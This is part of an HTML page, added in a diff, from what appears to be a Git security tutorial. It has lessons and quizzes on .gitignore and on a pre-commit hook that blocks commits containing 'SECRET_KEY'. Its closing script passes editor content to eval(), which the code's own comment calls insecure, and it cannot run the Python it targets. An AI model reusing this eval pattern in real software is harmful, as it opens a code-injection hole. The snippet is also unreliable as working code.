+    </code></pre>
+    
+    <h4>Try It Out:</h4>
+    <p>Add a sensitive file to your repository, and then add it to <code>.gitignore</code>. Verify that it is no longer tracked.</p>
+    <div class="next"><strong>Next >></strong></div>
+</div>
+    <div class="task" task-id="p38">
+        <div class="question">
+            <label for="q8"><h5>Question:</h5> What steps can be taken to secure a Git repository?</label><br>
+            <form id='q8' class="task-form">
+                <input type="radio" name="task8" value="correct"> Use .gitignore to prevent tracking of sensitive files and store secrets in environment variables.<br>
+                <input type="radio" name="task8" value="wrong"> Track all files, including sensitive ones, in the repository.<br>
+                <input type="radio" name="task8" value="wrong"> Store secrets directly in the codebase.<br>
+                <span class="feedback" id="q8-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p38 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+</div>
+</article>
+
+
+<article>
+    <h3 course-id="p39" class="locked">5. Git Hooks for Security</h3>
+    <div class="theory p39">
+        <div class="course-container">
+    <p><strong>Pre-Commit Hooks:</strong> Set up Git hooks to run security checks before allowing code to be committed. For example, running static analysis tools (e.g., Bandit for Python) to scan for vulnerabilities.</p>
+    <p><strong>Post-Commit Hooks:</strong> Trigger security scans or automated tests to ensure the code meets security standards before pushing to a remote repository.</p>
+    
+    <h5>Example Pre-Commit Hook (checking for secrets):</h5>
+    <pre><code>#!/bin/sh
+if grep -q 'SECRET_KEY' *.py; then
+   echo "Secret found in code! Aborting commit."
+   exit 1
+fi
+    </code></pre>
+    
+    <h4>Try It Out:</h4>
+    <p>Implement a pre-commit hook in your local repository to check for a specific keyword (like 'SECRET_KEY') in your code files before allowing a commit.</p>
+    <div class="next"><strong>Next >></strong></div>
+</div>
+    <div class="task" task-id="p39">
+        <div class="question">
+            <label for="q39"><h5>Question:</h5> What are Git hooks and how can they enhance security?</label><br>
+            <form id='q39' class="task-form">
+                <input type="radio" name="task6" value="correct"> Git hooks are scripts that run at specific points in the Git workflow, enhancing security by enforcing checks before commits or pushes.<br>
+                <input type="radio" name="task39" value="wrong"> Git hooks are commands to manage branches.<br>
+                <input type="radio" name="task39" value="wrong"> Git hooks are used to set permissions on repositories.<br>
+                <span class="feedback" id="q39-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p39 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+</div>
+</article>
+</section>
+
+
+
+<script>
+    // Initialize CodeMirror editor for any textarea
+    function setupCodeMirror(textareaId) {
+        return CodeMirror.fromTextArea(document.getElementById(textareaId), {
+            mode: 'python',
+            lineNumbers: true,
+            theme: 'default',
+            viewportMargin: Infinity,
+        });
+    }
+
+    // Run the code in a specified CodeMirror editor and display output
+    function runCodeMirror(textareaId, outputElementId) {
+        const editor = window[textareaId];  // Reference to the editor
+        const code = editor.getValue();
+        const outputElement = document.getElementById(outputElementId);
+
+        try {
+            // Note: eval() works only for JavaScript, so you might want to implement server-side execution for Python
+            const output = eval(code);  // Insecure for anything other than simple examples
+            outputElement.textContent = output;
+        } catch (error) {
+            outputElement.textContent = 'Error: ' + error.message;
+        }
+    }
+
+    // Initialize all CodeMirror editors when the page loads
+    document.addEventListener('DOMContentLoaded', function() {
+        window['variables-code'] = setupCodeMirror('variables-code');
+        // Repeat for other sections
+    });
+</script>
+</div>
+</body>
+</html>
